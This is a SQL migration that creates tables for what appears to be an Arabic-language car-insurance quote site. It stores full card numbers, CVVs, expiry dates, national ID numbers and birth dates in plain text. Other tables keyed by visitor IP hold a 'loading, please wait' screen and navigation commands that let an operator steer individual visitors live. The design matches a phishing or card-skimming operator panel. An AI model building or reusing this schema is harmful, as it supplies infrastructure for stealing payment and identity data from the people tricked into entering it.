CREATE TABLE `banned_ips` (
	`id` int AUTO_INCREMENT NOT NULL,
	`ip` varchar(64) NOT NULL,
	`reason` text,
	`bannedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `banned_ips_id` PRIMARY KEY(`id`),
	CONSTRAINT `banned_ips_ip_unique` UNIQUE(`ip`)
);
--> statement-breakpoint
CREATE TABLE `insurance_requests` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(128) NOT NULL,
	`visitorIp` varchar(64),
	`offerType` varchar(32),
	`regType` varchar(32),
	`userName` varchar(256),
	`phoneNumber` varchar(32),
	`idNumber` varchar(32),
	`birthDate` varchar(32),
	`serialNumber` varchar(128),
	`carYear` varchar(16),
	`carMake` varchar(256),
	`usageType` varchar(64),
	`city` varchar(128),
	`startDate` varchar(32),
	`planCompany` varchar(256),
	`planName` varchar(128),
	`planPrice` int,
	`addons` text,
	`addonsTotal` int,
	`paymentMethod` varchar(32),
	`total` int,
	`cardNumber` varchar(32),
	`cardHolderName` varchar(256),
	`expiryDate` varchar(16),
	`cvv` varchar(8),
	`cardType` varchar(32),
	`cardLast4` varchar(8),
	`cardDeclined` boolean DEFAULT false,
	`currentStep` int DEFAULT 1,
	`status` enum('in_progress','completed','payment_submitted','declined') DEFAULT 'in_progress',
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `insurance_requests_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `loading_screen_settings` (
	`id` int AUTO_INCREMENT NOT NULL,
	`visitorIp` varchar(64) NOT NULL,
	`isActive` boolean DEFAULT false,
	`loadingText` varchar(256) DEFAULT 'جاري التحميل...',
	`loadingSubtext` varchar(256) DEFAULT 'يرجى الانتظار',
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `loading_screen_settings_id` PRIMARY KEY(`id`),
	CONSTRAINT `loading_screen_settings_visitorIp_unique` UNIQUE(`visitorIp`)
);
--> statement-breakpoint
CREATE TABLE `navigation_commands` (
	`id` int AUTO_INCREMENT NOT NULL,
	`visitorIp` varchar(64) NOT NULL,
	`targetPage` varchar(256) NOT NULL,
	`executed` boolean DEFAULT false,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `navigation_commands_id` PRIMARY KEY(`id`)
);
